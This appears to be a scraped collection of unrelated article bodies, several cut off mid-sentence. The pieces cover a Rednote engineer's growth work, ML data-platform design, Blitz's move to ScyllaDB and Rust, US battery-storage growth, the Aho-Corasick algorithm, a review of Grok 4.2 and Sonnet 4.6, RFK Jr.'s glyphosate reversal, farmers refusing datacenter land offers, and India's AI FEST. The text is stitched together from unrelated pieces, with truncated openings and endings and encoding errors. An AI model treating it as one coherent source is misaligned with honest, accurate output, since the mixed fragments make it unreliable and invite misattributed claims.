a Tech Lead Manager, Jiang initially spearheaded Android efforts through a dedicated task force, experimenting with targeted, smaller markets such as Japan. These early tests helped refine product approaches, but Rednote remained overwhelmingly oriented toward its core Chinese user base. That changed dramatically in early 2025, when political uncertainty around TikTok in the U.S. sparked a massive wave of international \"refugees\" flocking to the platform, transforming global expansion from a strategic long-term goal into an immediate, high-stakes priority.</p><p>To capitalize on this sudden opportunity and drive sustainable user growth, Jiang focused on aggressive yet user-respecting growth hacking tactics centered on lowering barriers for non-Chinese speakers. A cornerstone of this push was leading a comprehensive overhaul of the internal i18n (internationalization) SDK and supporting platform infrastructure. This modernization streamlined the adoption of translated string resources across the engineering organization, making it far easier and faster for teams to localize the app without friction. By enabling a more efficient workflow for handling multilingual content and UI elements, the revamp directly accelerated the rollout of region-specific adaptations, boosting accessibility and retention among new global arrivals who might otherwise bounce because of language barriers.</p><p>Building on this foundation, Jiang's team experimented with and shipped innovative content translation capabilities powered by cutting-edge LLM-based approaches. Rather than relying on traditional, often clunky machine translation pipelines, this method delivered more natural, context-aware translations of posts, comments, and in-app elements, particularly bridging Mandarin and English in real time. The feature not only made the predominantly Chinese feed comprehensible to newcomers but also encouraged meaningful engagement, as users could read, react to, and respond across languages with minimal effort.</p><p>These technical leaps culminated in breaking down long-standing communication barriers between the Chinese and international communities on the platform. What began as a reactive scramble to accommodate influxes of TikTok migrants evolved into genuine cross-cultural growth: non-Chinese users discovered authentic lifestyle content, shared their own perspectives, and formed connections that fueled organic virality and active usage. Features emerging from this work even sparked memes and media headlines, amplifying Rednote's visibility in new markets. True to Jiang's philosophy, these initiatives prioritized intuitive, frictionless experiences over manipulative tricks, proving that building better, more inclusive products can drive meaningful, efficient growth without exploiting users. By modernizing infrastructure and leveraging smart translation innovation, the team turned a geopolitical moment into sustained momentum for Rednote's global ambitions.</p><p>Jiang remains deeply committed to Rednote’s global expansion, channeling his expertise in user growth to turn the platform's unexpected momentum into lasting international traction. Hands-on with production-scale implementations of KMP and CMP, he sees these technologies as game-changers for cross-platform development, delivering near-native performance and scalability while slashing duplicated engineering effort and enabling faster iteration on features that drive user acquisition and retention across diverse markets.</p><p>Yet for Jiang, technology serves growth only when it prioritizes the user. His approach to growth hacking emphasizes clever, ethical levers: overhauling internationalization infrastructure for seamless multilingual support, pioneering LLM-powered translations that make content accessible across languages, and shipping region-specific features that spark organic virality without relying on addictive dark patterns or attention manipulation. These moves lowered friction for millions of new users, especially those arriving amid the 2025 TikTok uncertainty, boosting activation, engagement, and cross-cultural sharing in ways that fueled genuine, efficient growth.</p><p>In an industry crowded with short-term tricks and noise, Jiang’s contributions stand apart: they don’t chase fleeting attention through exploitation; they earn sustained usage by building intuitive, trust-building experiences that empower users to connect, discover, and stay longer on their own terms.</p>",

What determines long-term reliability is not access to these tools, but how intentionally they are composed.</p><p>An effective ML-ready platform evolves across four connected layers:</p><ol><li>Observability and governance</li></ol><p>Each layer addresses a specific class of production failure, and together they create the conditions required for reliable ML systems.</p><h3>Ingestion: Establishing Ownership and Preventing Silent Breakage</h3><p>In many organizations, ingestion pipelines prioritize speed. Events flow into centralized systems with limited validation. This approach accelerates early experimentation and reduces friction between teams.</p><p>Over time, the cost of that flexibility becomes visible.</p><p>When producers modify event schemas without structured review, downstream pipelines adapt unpredictably. ML systems amplify inconsistencies because they rely on stable feature definitions.</p><p>Introducing ingestion contracts shifts responsibility closer to the source. Data contracts define schema structure, ownership, validation rules, and change management processes. Breaking changes the surface immediately rather than cascading silently downstream.</p><p>On cloud platforms, this typically involves managed schema registries, streaming ingestion services, and CI and CD checks integrated with producer deployments.</p><p>By enforcing validation at ingestion boundaries, organizations reduce downstream firefighting and shorten feedback loops.</p><h3>Storage: Preserving Historical Correctness for Reproducibility</h3><p>Once ingestion establishes accountability, storage determines whether systems remain reproducible.</p><p>Machine learning workflows depend on access to historical states for retraining, root cause analysis, and model comparison across releases. Overwrite-based storage models compromise that visibility, particularly when historical corrections are made without version tracking.</p><p>Modern cloud storage architectures address this through object storage combined with table formats that support snapshot isolation and schema evolution.</p><p>Teams commonly implement this using durable object storage with formats such as Iceberg or Hudi that enable time travel and versioned reads. Governance layers reinforce access controls and retention policies.</p><p>When historical correctness is preserved, model behavior becomes explainable rather than speculative. Reproducibility shifts from a best effort exercise to an operational capability.</p><p>Even with strong ingestion and storage layers, instability can emerge in transformation logic.</p><p>Analytics transformations often emphasize readability and turnaround speed. Machine learning systems require deterministic execution across retraining cycles and deployments.</p><p>Non-versioned logic, manual overrides, and hidden dependencies introduce variation that becomes visible only after performance shifts.</p><p>Version-controlling transformation logic, tying releases to deployment processes, and separating business rules from data hygiene concerns reduce this variability. Orchestration tools on cloud platforms support both batch and event-driven pipelines while maintaining traceability.</p><p>The objective is consistency. When transformations behave predictably, retraining cycles produce outcomes that teams can explain and trust.3</p><h2>Observability and Governance: Detecting Issues Before Users Do</h2><p>Even well-designed pipelines require continuous monitoring.</p><p>Late-arriving data, distribution shifts, and schema changes often surface first as degraded model performance. Without monitoring, detection occurs only after user-facing impact.</p><p>Effective ML-ready platforms incorporate freshness monitoring, volume anomaly detection, schema validation alerts, and drift metrics directly into operational workflows. Cloud-native monitoring tools and data validation frameworks support this visibility.</p><p>Governance frameworks further reinforce stability by clarifying access standards, retention policies, and compliance requirements.</p><p>When observability and governance are embedded into platform design, reliability becomes measurable and actionable rather than assumed.4, 5</p><h2>Aligning Data Engineering, Machine Learning Engineering, and Product Teams</h2><p>Architecture alone does not determine outcomes. Organizational alignment plays an equally important role.</p><p>Data teams often optimize for reporting throughput. ML teams prioritize experimentation velocity. Product teams focus on feature delivery timelines.</p><p>Individually rational priorities can introduce friction when shared definitions of readiness are absent.</p><p>Cross-functional incident reviews, shared service-level expectations for data freshness, and joint prioritization of reliability investments help close these gaps. Treating machine learning systems as production features supported by shared infrastructure reduces hidden risk.</p><p>When alignment improves, platform reliability becomes a shared objective rather than an isolated responsibility.6, 7</p><p>Several principles appear consistently in durable ML-ready platforms.</p><p>Early data architecture decisions determine long-term reliability. Ingestion discipline prevents silent breakage. Historical correctness enables reproducibility and debugging. Observability shortens detection and response times. Organizational alignment prevents risk from compounding unnoticed.</p><p>Engineering leaders influence outcomes by treating data platforms as long-lived production systems rather than delivery artifacts. This perspective shifts investment toward ingestion guarantees, historical integrity, and operational visibility before increasing model complexity.</p><p>Leaders evaluating readiness benefit from concrete diagnostic questions.</p><ul><li>Can teams reproduce a model from a prior release using the same data snapshot?</li><li>Do data producers know when changes break downstream pipelines?</li><li>Can the platform detect data drift before users experience degraded behavior?</li></ul><p>Platforms that answer these questions confidently support reliable machine learning execution.</p><p>The progression from experimentation to production machine learning requires more than scaling compute resources. It requires deliberate architectural choices across ingestion, storage, transformation, and observability.</p><p>Organizations that invest early in enforceable guarantees reduce firefighting, accelerate retraining cycles, and increase trust in model behavior.</p><p>Reliable machine learning systems are built on reliable data platforms. Cloud infrastructure provides the building blocks. Sustainable success depends on how thoughtfully those blocks are assembled.</p>",

Even though the two states are fundamentally distinct, we showed that a quantum computer may find it hard to tell which one it is given.

      "content": "<h3><strong>How Blitz scaled their game coaching app with lower latency and leaner operations</strong></h3><p><a href=\"http://blitz.gg/\">Blitz</a>&nbsp;is a fast-growing startup that provides personalized coaching for games such as League of Legends, Valorant, and Fortnite. They aim to help gamers become League of Legends legends through real-time insights and post-match analysis.</p><p>While players play, the app does quite a lot of work. It captures live match data, analyzes it quickly, and uses it for real-time game screen overlays plus personalized post-game coaching. The guidance is based on each player’s current and historic game activity, as well as data collected across billions of matches involving hundreds of millions of users.</p><p>Thanks to growing awareness of Blitz’s popular stats and game-coaching app, their steadily increasing user base pushed their original Postgres- and Elixir-based architecture to its limits. This blog post explains how they recently overhauled their League of Legends data backend – using Rust and ScyllaDB.</p><p>&nbsp;– In order to provide low latency, high availability, and horizontal scalability to their growing user base, they ultimately:</p><ul><li>Migrated backend services from Elixir to Rust.</li><li>Replaced Postgres with ScyllaDB Cloud.</li><li>Heavily reduced their Redis footprint.</li><li>Removed their Riak cluster.</li><li>Replaced queue processing with realtime processing.</li><li>Consolidated infrastructure from over a hundred cores of microservices to four n4‑standard‑4 Google Cloud nodes (plus a small Redis instance for edge caching)</li></ul><p>As an added bonus, these changes ended up cutting Blitz’s infrastructure costs and reducing the database burden on their engineering staff.</p><p>As Naveed Khan (Head of Engineering at Blitz) explained, “We collect a lot of data from game publishers and during gameplay. For example, if you’re playing League of Legends, we use Riot’s API to pull match data, and if you install our app we also monitor gameplay in real time. All of this data is stored in our transactional database for initial processing, and most of it eventually ends up in our data lake.”</p><p>One key part of Blitz’s system is the Playstyles API, which analyzes pre-game data for both teammates and opponents. This intensive process evaluates up to 20 matches per player and runs nine separate times per game (once for each player in the match). The team strategically refactored and consolidated numerous microservices to improve performance. But the data volume remained intense. According to Brian Morin (Principal Backend Engineer at Blitz), “Finding a database solution capable of handling this query volume was critical.”</p><p>They originally used Postgres, which served them well early on. However, as their write-heavy workloads scaled, the operational complexity and costs on Google Cloud grew significantly. Moreover, scaling Postgres became quite complex. Naveed shared, “We tried all sorts of things to scale. We built multiple services around Postgres to get the scale we needed: a Redis cluster, a Riak cluster, and Elixir Oban queues that occasionally overflowed. Queue management became a big task.” To stay ahead of the game, they needed to move on.</p><p>As startups scale, they often switch from “just use Postgres” to “just use NoSQL.” Fittingly, the Blitz team considered moving to MongoDB, but eventually ruled it out. “We had lots of MongoDB experience in the team and some of us really liked it. However, our workload is very write-heavy, with thousands of concurrent players generating a constant stream of data. MongoDB uses a single-writer architecture, so scaling writes means vertically scaling one node.” In other words,&nbsp;<a href=\"https://www.scylladb.com/2023/11/02/mongodb-vs-scylladb-architecture-comparison/\">MongoDB’s primary-secondary architecture</a>&nbsp;would create a bottleneck for their specific workload and anticipated growth.</p><p>They then decided to move forward with RocksDB because of its low latency and cost considerations. Tests showed that it would meet their latency needs, so they performed the required data (re)modeling and migrated a few smaller games over from Postgres to RocksDB. However, they ultimately decided against RocksDB due to scale and high availability concerns. “Based on available data from our testing, it was clear RocksDB wouldn’t be able to handle the load of our bigger games – and we couldn’t risk vertically scaling a single instance, and then having that one instance go down,” Naveed explained.</p><p>One of their backend engineers suggested ScyllaDB, so they reached out and ran a proof of concept. They were primarily looking for a solution that can handle the write throughput, scales horizontally, and provides high availability. \\n They tested it on their own hardware first, then moved to ScyllaDB Cloud. Per Naveed, “The cost was pretty close to self-hosting, and we got full management for free, so it was a no-brainer. We now have a significantly reduced Redis cluster, plus we got rid of the Riak cluster and Oban queues dependencies. Just write to ScyllaDB and it all just works. The amount of time we spend on infrastructure management has significantly decreased.”</p><p>Performance-wise, the shift met their goal of leveling up the user experience … and also simplified life for their engineering teams. Brian added, “ScyllaDB proved exceptional, delivering robust performance with capacity to spare after optimization. Our League product peaks at around 5k ops/sec with the cluster reporting under 20% load. Our biggest constraint has been disk usage, which we’ve rolled out multiple updates to mitigate. The new system can now often return results immediately instead of relying on cached data, providing more up-to-date information on other players and even identifying frequent teammates. The results of this migration have been impressive: over a hundred cores of microservices have been replaced by just four n4-standard-4 nodes and a minimal Redis instance for caching. Additionally, a 3xn2-highmem ScyllaDB cluster has effectively replaced the previous relational database infrastructure that required significant computing resources.”</p><p><strong>High-Level Architecture of Blitz Server with Rust and ScyllaDB</strong></p><h2>Rewriting Elixir Services into Rust</h2><p>As part of a major backend overhaul, the Blitz team began rethinking their entire infrastructure – beyond the previously described shift from Postgres to the high-performance and distributed ScyllaDB. Alongside this database migration, they also chose to sunset their Elixir-based services in favor of a more modern language. After careful evaluation, Rust emerged as the clear choice. “Elixir is great and it served its purpose well,” explained Naveed. “But we wanted to move toward something with broader adoption and a stronger systems-level ecosystem. Rust proved to be a robust and future-proof alternative.”</p><p>Now that the first batch of Rust rewritten services are in production, Naveed and team aren’t looking back: “Rust is fantastic. It’s fast, and the compiler forces you to write memory-safe code upfront instead of debugging garbage-collection issues later. Performance is comparable to C, and the talent pool is also much larger compared to Elixir.”</p>",

Electrek reports: According to the US Energy Storage Market Outlook Q1 2026 from the Solar Energy Industries Association (SEIA) and Benchmark Mineral Intelligence, installations are now four times higher than totals from just three years ago. The US had a total of 137 GWh of utility-scale storage installed as of 2025, plus 19 GWh of commercial and industrial systems and 9 GWh of residential storage. Analysts expect the growth streak to continue. More than 600 GWh of energy storage is projected to be deployed nationwide by 2030, even as the Trump administration targets clean energy industries.\n \nTwo-thirds of utility-scale storage installed in 2025 was built in red states, including nine of the top 15 states for new installations. Texas is projected to surpass California as the countryâ(TM)s largest battery storage market in 2026. Standalone battery projects accounted for nearly 30 GWh of new capacity in 2025, while solar-plus-storage installations made up about 20 GWh. Residential storage deployments reached 3.1 GWh last year, a 51% increase year-over-year. Analysts say virtual power plant programs in states such as Massachusetts, Texas, Arizona, and Illinois are helping drive adoption by reducing costs and easing strain during peak demand periods.\n \nThe supply chain is shifting to support the boom. In 2025, some battery cell manufacturers pivoted production from EV batteries to dedicated stationary storage cells, converting existing lines and adjusting future plans. Lithium-ion cell manufacturing for stationary storage reached more than 21 GWh in 2025, enough to power Houston overnight, according to SEIAâ(TM)s Solar and Storage Supply Chain Dashboard. Meanwhile, US factories now have the capacity to manufacture 69.4 GWh of battery energy storage systems annually.",

Just build a finite state  machine and exploit shared suffixes. Basically, a tree (of strings)  where each node represents a prefix of one of your keywords. As you scan  through your text character by character, you move through this graph.  Sounds eerily similar to a trie? That’s because it’s a trie!</p><p>What’s clever is that the algorithm builds “failure links” between  nodes. In English, that’s - “if the next character doesn’t match, don’t  start from the root. Jump to this other node in the tree that shares the  longest suffix.”</p><p>Let me show you a simple example. If you’re searching for <code>{a, ab, b, bc, bca, c, ca, caa}</code>, the algorithm builds a trie (prefix tree) and adds the extra links you see in blue/green:</p><p>If you’re familiar with a , it just adds a .  That way, you can instantly jump to the longest matching suffix instead  of scanning the word from root again. Let’s say you’re searching ,  you walk through this trie (automaton) once, character by character.  The text is only scanned once - so you end up with a time complexity of  O(n); where n is the length of the text.</p><p>A naive approach would have you scanning the word again and again; O(n *  m * k) where m is the number of keywords and k is their average length.  Aho-Corasick is O(n+m+z), where z is the number of matches. Even if you  searched for millions of keywords, Aho-Corasick handles it linearly.</p><p>You can find a <a href=\"https://github.com/rizanB/motif_searcher/\">simple implementation</a> in my recent project, where I adapted it for searching 9 mutations (patterns) in a genome file (basically 4M characters), and it searched  the whole thing in 0.75s. Sure, the patterns I’m using are tiny, but  it’s pretty fast!</p><p>I’m showing a simple example so you get how it works.</p><pre><code># naive approach\nfor comment in reddit_comments:\n    for keyword in keywords:\n        if keyword in comment:\n            # alert user\n\n# with aho-corasick\nstep 1: build an automaton (trie) using patterns\nstep 2: add failure links (with bfs)\nstep 3: search automaton by following failure links, and return patterns that matched\n</code></pre><p>I think the implementation is about 60 lines of actual code.</p><p>There’s also a recent library - ; it’s super easy to use.</p><p>You don’t have to spam  when searching for three keywords in a paragraph. Use it when:</p><ul><li>you’re searching for thousands of keywords that don’t change often (F5Bot usecase)</li><li>it needs to run often (think streams)</li></ul><p>The Aho-Corasick was invented by Margaret with a pen and paper 50  years ago, without any AI. Still, the core ideas hasn’t changed much in  multi-pattern string matching.</p><p>Computers today are millions of times faster, and the $600 search  problem would be trivial today. But if you’re processing millions of  Reddit comments per day on a tiny VPS, you can’t just throw hardware at  the problem.</p><p>Food for thought, there’s probably a 50-year-old algorithm that  solves your problem better than whatever you’re about to implement. If you read this far, let me know if you know what algorithms you find exciting!</p><ol><li>Margaret J. Corasick’s PhD dissertation (1974) was “securing proprietary data within open systems” - early information security. Sad that she doesn’t have her own Wikipedia page, despite her algorithm and Alfred Aho (he’s the ‘A’ in AWK - Aho, Weinberger, Kernighan) both having their own Wikipedia pages.</li><li>There’s a <a href=\"https://pypi.org/project/pyahocorasick/\">Python library</a> called   that’s implemented in C for production use. I’m sure it’s way faster than my version, but the principles are identical. I’ll run a benchmark soon.</li><li>KMP (Knuth-Morris-Pratt) uses a similar approach for compiling patterns into a finite automata. Basically  for a single pattern. Both precompute a structure and exploit prefixes that show up.</li><li>The Aho-Corasick automaton can become massive - O(total characters in all keywords).

      "content": "<p>We got new model releases from xAI and Anthropic last week, and I wanted to give my quick impressions to help you know if/when you should care.</p><p>This is just after a half day of testing, so my impressions may change, but… we’re usually locked in on the vibe pretty quickly.</p><p>By the way,&nbsp;<strong><em>even if you aren’t interested in Grok</em></strong>, take a read of the analysis below — we’ll talk about subagent systems in a way that will probably be broadly useful as more AI products use multi-agent systems.</p><p>Elon has been hyping this one for months, so everyone in the industry has been expecting a giant leap. Grok 4.1 was also better than expected at release (it’s regressed since then). So, there was some reason to believe xAI was making good progress.</p><p>, but not impressive.</p><p>First, allow me a bit of frustration here: it’s so incredibly childish that the model is called Grok 4.20 in the interface (get it? weed, so clever). Not that we should be surprised at this point, but we shouldn’t stop calling it out.</p><p>Okay, onto the performance — Grok 4.2 (the model’s actual name) is a multi-agent orchestrator. When you give it a prompt, a lead agent seems to be the one to kick off the searches, and then individual AI ‘personas’ (who have dedicated names) run in parallel chains.</p><p>In normal mode, that’s 4 subagents, and with Grok Heavy, it’s up to 16.</p><p>The&nbsp;&nbsp;idea behind multi-agent or multi-subagent architectures is that you get sub-specialty or at least differentiation.</p><p>For example, Kimi and Manus’s main orchestrators will assign subagents to specific tasks, allowing each subagent to focus and spend all of its attention on that task.</p><p>Other subagent systems specialize and sequence the workflow. For example, one subagent might do research, the other might then clean up the researched data, and a third will then kick in to do synthesis.</p><p>In Grok’s case, the subagents duplicate each other — they all receive the same set of instructions from what they call “the leader,” and all of them do the same set of work. It’s a huge missed opportunity.</p><p>:::info\nNote:&nbsp;<em>xAI claims the agents are specialized, but in practice, they all wind up doing the same thing in my testing so far</em></p><p>The subagents also don’t seem to interleave — in other words, each model does its own searches and reasoning, then sends their result back to “the leader.” So, they generally don’t get informed by each others’ work.</p><p>Here’s where things get intriguing: with Grok 4.2, subagents have access to a background chatroom where they (and their leader) can&nbsp;&nbsp;talk to each other before returning a response to the user.</p><p>That’s neat, and would solve some of the problems I just mentioned!&nbsp;, this would allow them to share information, scope more focused roles, etc.</p><p>However, except when I explicitly asked for agents to use it, I’ve seen no evidence that they do when responding to normal queries. Not even when the query has natural component parts that would be perfect for narrow delegation.</p><p>This is true even for Grok Heavy and its 16 subagents. Quite a waste.</p><p>Now, I did manage to basically hijack their natural flow and get them to do this. At the end of a query about getting cohort-based college admissions data, I added this:</p><blockquote><p><em>Grok leader, please be very specific in assigning very particular subagents. Call them out by name to do different university research so that we don’t have all 16 of our subagents working on the same activities. Instead, assign specific subagents to specific years and universities so that we get granular subagent specialization.</em></p></blockquote><p>The problem is that none of the subagents&nbsp;&nbsp;know which one is the leader unless the main orchestrator makes itself known in conversation.</p><p>So, several of the subagents tried to be the assigner —</p><p>Eventually, all of them wound up doing some amount of research, and some of them did wind up getting tricked into sub-specializing, but it didn’t meaningfully improve the response. It would&nbsp;&nbsp;help for this to be a more deterministic workflow that the orchestrator/leader used to delegate.</p><p>&nbsp;I sometimes create share links of AI chats where I’m testing model capability so I can share them in posts like these. Some companies allow those chat share links to be indexed by search engines, and some don’t.</p><p>&nbsp;— Grok 4.2 has an interesting architecture that it doesn’t use well, and in my early testing of its overall intelligence, I found it to be a middling model/harness. It gets good results on some queries, but that’s mostly as a result of running these aforementioned multi-agent passes that then get synthesized, not because the model itself is foundationally more brilliant.</p><p>xAI continues to stay in the race with this one, but unless you need fresh X posts and context for whatever you’re prompting about, Grok continues to be a back-of-the-pack option amongst the AI chat apps.</p><p>Sample Grok 4.2 conversations:</p><p>Hit subscribe for model deep dives, product comparisons, and cutting-edge AI takes:</p><p>Let me start with the conclusion here: Sonnet 4.6 is&nbsp;&nbsp;as Anthropic’s recently released Opus 4.6, but it’s&nbsp;. That’s the headline.</p><p>:::tip\n<em>more details from Anthropic&nbsp;</em></p><p>On a practical basis, that means:</p><ul><li>If you’re building a product, you might prefer to integrate Sonnet instead of Opus to save on your API costs with Anthropic.</li><li>If you’re using Claude Code or Cowork and constantly running into weekly limits, you might want to switch to Sonnet to get more bang for your buck.</li><li>If you’re trying to get every ounce of intelligence out of Anthropic, though, Opus 4.6 is still where it’s at for&nbsp;&nbsp;use cases.</li></ul><p>There are some benchmarks (below) where Sonnet 4.6 beats Opus 4.6, like GDPval-AA (which measures real-world economically valuable tasks), but that’s usually going to be as a result of its speed somehow helping it when it’s being used in certain environments (ex. because it’s faster, it’s better at iterating through an Excel file within a time constraint).</p><p>In my general use so far in chat contexts, I don’t find a major difference between Sonnet 4.6 and Opus 4.6, and I don’t plan to use it in coding contexts because I like to use the smartest coding models available to me.</p><p>So, there you have it — that’s Sonnet 4.6.</p><p>Some of you might know that I run a personal model benchmark. I send 60%+ of my prompts to multiple LLMs in their chat applications, and then stack rank the responses. I’m biased, but I think it’s the best AI benchmark on earth.</p><p>We don’t have enough data yet for Grok 4.2 or Sonnet 4.6, but I don’t expect either model to disrupt the current status quo as of February 17:</p><p><strong>For more from me on all things AI (everyday shortcuts, breakthrough tactics, and deep dive analysis), check out <a href=\"https://aimuscle.com/\">AI Muscle</a>.</strong></p>",

      "content": "<p>One of the more perplexing questions in all of the coverage I’ve done on <a href=\"https://www.techdirt.com/tag/rfk-jr/\">RFK Jr.</a> has been whether or not Kennedy is some misguided true believer or if this is all some grift for power, influence, and/or money. While most people who watch how RFK Jr. has operated on the topic of vaccines, for instance, both before and after he entered government, they assume he’s a real, if stupid, crusader. But they will tell you the same when it comes to <a href=\"https://www.techdirt.com/2025/07/17/rfk-jr-promotes-meal-delivery-company-that-serves-ultra-processed-food/\">processed foods</a> and <a href=\"https://www.techdirt.com/2025/08/19/maha-draft-report-pesticides-processed-foods-unmentioned-but-conspiracy-theories-abound/\">pesticides</a>, two topics on which Kennedy has also crusaded for years, and two topics that have been noticeably absent or reversed now that he’s in government.</p><p>The pesticide topic was recently thrust back into the news. Trump signed an executive order that essentially demanded that two chemicals be produced in higher quantities: phosphorus and glyphosate. Kennedy then came out to <a href=\"https://www.cnbc.com/2026/02/19/trump-kennedy-glyphosate-maha-midterms-rfk-jr.html\">cheerlead the executive order as well</a>, which was odd when you consider what glyphosate is chiefly used for.</p><blockquote><p><em>Trump on Wednesday night signed an&nbsp;<a href=\"https://www.cnbc.com/2026/02/18/trump-executive-order-weedkiller-hated-by-maha.html\">executive order</a>&nbsp;invoking the Defense Production Act to compel the domestic production of elemental phosphorus and glyphosate-based herbicides.&nbsp;<a href=\"https://www.cnbc.com/2026/02/18/trump-executive-order-weedkiller-hated-by-maha.html\">Glyphosate</a>&nbsp;is the chemical in&nbsp;<a href=\"https://www.cnbc.com/quotes/BAYERCROP-IN/\">Bayer-Monsanto’s</a>&nbsp;Roundup and is the most commonly used herbicide for a slew of U.S. crops. Trump, in the order, said shortages of both phosphorus and glyphosate would pose a risk to national security.</em></p><p><em>Kennedy backed the president in a statement to CNBC Thursday morning.</em></p><p><em>“Donald Trump’s Executive Order puts America first where it matters most — our defense readiness and our food supply,” he said. “We must safeguard America’s national security first, because all of our priorities depend on it. When hostile actors control critical inputs, they weaken our security. By expanding domestic production, we close that gap and protect American families.”</em></p></blockquote><p>Bayer-Monsanto has been the defendant in a number of lawsuits over its Roundup product. Specifically, those suits have been powered by claims that glyphosate causes <a href=\"https://www.mayoclinic.org/diseases-conditions/non-hodgkins-lymphoma/symptoms-causes/syc-20375680\">non-Hodgkin’s lymphoma</a>, a form of cancer primarily impacting blood cells. Whether or not you or I think those claims are true, Kennedy sure said he did, since he acted as counsel in some of these suits.</p><p>The <a href=\"https://www.protectourcare.org/maha-betrayal-to-appease-trumps-chemical-company-donors-rfk-jr-flip-flops-touting-potentially-harmful-pesticide-he-once-railed-against/\">MAHA crowd is understandably pissed</a>. Building a career on these very concrete health stances, only to reverse course while in government to appease Dear Leader, is a fairly horrible look. And it’s actually a worst of both worlds situation, as his MAHA crowd is pointing to his failed promises and hypocrisy, while those who are generally his opponents are pointing out that this might be a stance in which he was actually acting rationally before pulling a u-turn.</p><blockquote><p><em>“This was one of the few issues where Secretary Kennedy actually embraced credible science,” said&nbsp;Kayla Hancock, Director of Public Health Watch, a project of Protect Our Care&nbsp;“But RFK Jr. tossed out his years of anti-pesticide advocacy and conviction like a used tissue to stay in the good graces of Donald Trump, who cares more about making his chemical company donors happy than protecting the public’s health. This makes it clear, Secretary Kennedy has no problem selling out his supposed value if there’s a quick buck to be made for special interest donors, or political points to be scored.”&nbsp;</em></p></blockquote><p>This seems as close to a solid answer to the question I posed at the start of this post as we’re likely to get. Kennedy, whatever else he might be, is not a true-believing crusader willing to hold firm to his beliefs. He simply does and says whatever will propel his influence and revenue. That’s it.</p><p>You’ve been lied to, MAHA people. Lied to and used to put in office the very people who have betrayed you. Let that sink in.</p>",

      "content": "An anonymous reader quotes a report from the Guardian: When two men knocked on Ida Huddleston's door last May, they carried a contract worth more than $33m in exchange for the Kentucky farm that had fed her family for centuries. According to Huddleston, the men's client, an unnamed \"Fortune 100 company,\" sought her 650 acres (260 hectares) in Mason county for an unspecified industrial development. Finding out any more would require signing a non-disclosure agreement. More than a dozen of her neighbors received the same knock. Searching public records for answers, they discovered that a new customer (PDF) had applied for a 2.2 gigawatt project from the local power plant, nearly double its annual generation capacity. The unknown company was building a datacenter. \"You don't have enough to buy me out. I'm not for sale. Leave me alone, I'm satisfied,\" Huddleston, 82, later told the men.\n \nAs tech companies race to build the massive datacenters needed to power artificial intelligence across the US and the world, bids like the one for Huddleston's land are appearing on rural doorsteps nationwide. Globally, 40,000 acres of powered land – real estate prepped for datacenter development -- are projected to be needed for new projects over the next five years, double the amount currently in use. Yet despite sums that often dwarf the land's recent value, farmers are increasingly shutting the door. At least five of Huddleston's neighbors gave similar categorical rejections, including one who was told he could name any price.\n \nIn Pennsylvania, a farmer rejected $15m in January for land he'd worked for 50 years. A Wisconsin farmer turned down $80m the same month. Other landowners have declined offers exceeding $120,000 per acre -- prices unimaginable just a few years ago. The rebuffs are a jarring reminder of AI's physical bounds, and limits of the dollars behind the technology. [...] As AI promises to transcend corporeal fallibility, these standoffs reveal its very physical constraints -- and Wall Street's miscalculation of what some people value most. In the rolling hills of Mason county and farmland across America, that gap is measured not in dollars but in something harder to price: identity.",

      "content": "<p>\\\n<strong>When Competition Becomes Clarity</strong></p><p>I've attended dozens of tech festivals. Most follow a familiar rhythm: morning keynotes, afternoon workshops, evening networking with samosas. You leave inspired, maybe connected, but rarely changed.</p><p>Walking into  at  in February, I expected more of the same. What I witnessed instead was something I haven't seen in India's student innovation circuit—a festival that forced people to stop pretending they were building and actually build.</p><p>This matter because India's AI conversation is stuck. We celebrate hackathons where nothing gets deployed. We applaud pitch competitions where nothing gets funded. AI FEST broke that pattern, and in doing so, revealed what's actually broken about how we support young builders in India.</p><p><strong>What I Watched Unfold Over Three Days</strong></p><p>Day One shifted everything with two announcements.</p><p>First was SANDBOX—a 90-day residency built exclusively for AI founders. The pitch was brutally honest: \"Most founders don't fail because they lack intelligence. They fail because they lack intensity, focus, and support at the exact moment they need it most.\" No fluff. Just a clear problem and a structured solution.</p><p>Second was Campus Tank, where student founders would move from idea to investor pitch in three days—backed by Apna, Venture Catalysts, and Chandigarh University. Real investors. Real capital. Real stakes.</p><p>What struck me wasn't the announcements themselves. It was how students reacted. At typical student tech fest India events, big launches get applause and Instagram stories. Here, I watched students immediately pull out notebooks. Ask logistical questions. Form groups in hallways. The energy wasn't performative. It was operational.</p><p>Day Two was where things got real. Campus Tank participants weren't sitting in lecture halls learning about customer discovery—they were doing it. On campus, in festival halls, on calls with potential users. SANDBOX's first applicant interviews were happening in parallel. I saw a team get rejected, regroup in 20 minutes, and return with a pivoted idea.</p><p>Day Three culminated with Campus Tank pitches. The questions investors asked weren't softballs. \"Who's your first paying customer?\" \"What's your CAC?\" \"Why can't an existing player build this in three months?\" These were founder questions, not student questions. And the students answered them—some well, some poorly, but all seriously.</p><p>By the end, AI FEST 2026 had produced something rare: not a conference afterglow, but a pipeline. SANDBOX had its first cohort. Campus Tank had funded ventures. And 300+ students left not with certificates, but with code repositories, customer feedback, and cap table questions.</p><p><strong>Why This Actually Matters Beyond the Campus Walls</strong></p><p>Here's the uncomfortable truth about India's innovation ecosystem: we've built a simulation layer on top of real entrepreneurship.</p><p>Students learn to perform \"founder.\" They master pitch deck aesthetics, memorize start-up jargon, network effectively. They win national student competitions, add it to LinkedIn, and move on. The system rewards participation theatre, not product velocity.</p><p>Most student hackathon 2026 formats optimize for:</p><p>48-hour sprints (when real products take months)</p><p>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Demo videos (when real traction requires deployed code)</p><p>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Judge scores (when real validation comes from customers)</p><p>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Prizes (when real success requires sustained support)</p><p>AI FEST 2026 explicitly designed programs to close that gap.</p><p>SANDBOX recognizes that founders don't need more \"ideation sessions.\" They need 90 days of structured intensity where they can validate, build, and ship without noise. It's not a better accelerator. It's a different operating system for execution.</p><p>Campus Tank treats student founders like real founders. When you're pitching to Venture Catalysts, you can't hide behind academic project standards. You need a business model. You need unit economics. That forces a maturity jump most students never make.</p><p>For the broader ecosystem, this signals that innovation infrastructure is decentralizing. AI FEST happened in Chandigarh, not Bangalore. It proved that talent is everywhere—what's missing is the activation energy. Universities like Chandigarh University are starting to provide it.</p><p>The One Thing Nobody Says About \"Support\"</p><p>The strongest insight from AI FEST 2026 isn't about AI or start-ups. It's about what support actually means when you're building something hard.</p><p>We talk about \"supporting founders\" constantly. Universities offer incubation canters. Governments launch start up schemes. Everyone wants to \"enable entrepreneurship.\"</p><p>But here's what I learned: support isn't resources. Support is 